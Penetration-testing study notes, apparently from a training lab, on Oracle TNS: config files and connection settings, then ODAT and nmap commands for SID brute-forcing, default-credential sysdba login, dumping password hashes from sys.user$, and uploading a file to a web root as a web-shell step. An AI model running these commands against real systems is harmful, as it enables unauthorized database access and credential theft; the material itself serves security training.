#### Oracle Transparent Network Substrate
- communication protocol that facilitates communication between Oracle databases and applications over networks
- built-in encryption
- authorised hosts 
- basic authentication
Useful for:
- Name resolution
- Connection management
- Load balancing
- Security
---
#### Default Configuration

System Identifier (`SID`) is a unique name that identifies a particular database instance
Port : TCP/1521
config files:
- `tnsnames.ora`: Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file. The entry consists of :
	- name for the service
	- network location of the service
	- database or service name that clients should use when connecting to the service.
- `listener.ora`
typically located in `$ORACLE_HOME/network/admin`

Used with other Oracle services like:
- Oracle DBSNMP
- Oracle Databases, 
- Oracle Application Server, 
- Oracle Enterprise Manager, 
- Oracle Fusion Middleware, 
and many more.

---
#### Features and key points:

- ***client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses***

- ***the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.***

- Oracle DB protected by PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory.

- *contains the names of PL/SQL packages or types that should be excluded from execution*

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|

### Footprinting

#### Installation of Oracle Interaction tools

Script for Installation:

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

#### ODAT (Oracle Database Attacking Tool)

```shell-session
./odat.py -h
```

```shell-session
./odat.py all -s 10.129.204.235
```

#### nmap

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open
```


#### Nmap - SID Bruteforcing

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```


#### SQLPlus- Login

```shell-session
sqlplus scott/tiger@10.129.204.235/XE
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session

sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
only select statements work, even for viewing tables and dbs and etc

for admin try,

```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

#### Oracle RDBMS - Extract Password Hashes

```shell-session
select name, password from sys.user$;
```

#### File Upload for Web Shell from Oracle RDBMS


```shell-session
echo "Oracle File Upload Test" > testing.txt
```

```shell-session

./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

```
